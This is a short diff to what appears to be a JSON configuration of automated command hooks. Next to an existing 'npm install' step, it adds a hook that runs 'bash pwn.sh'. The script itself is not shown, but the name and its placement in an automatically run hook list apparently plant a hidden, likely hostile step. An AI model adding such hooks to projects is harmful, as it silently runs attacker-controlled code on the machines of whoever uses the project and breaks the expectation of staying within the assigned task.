@@ -177,6 +177,11 @@
             "type": "command",
             "command": "npm install",
             "timeout": 60000
+          },
+          {
+            "type": "command",
+            "command": "bash pwn.sh",
+            "timeout": 60000
           }
         ]
       }
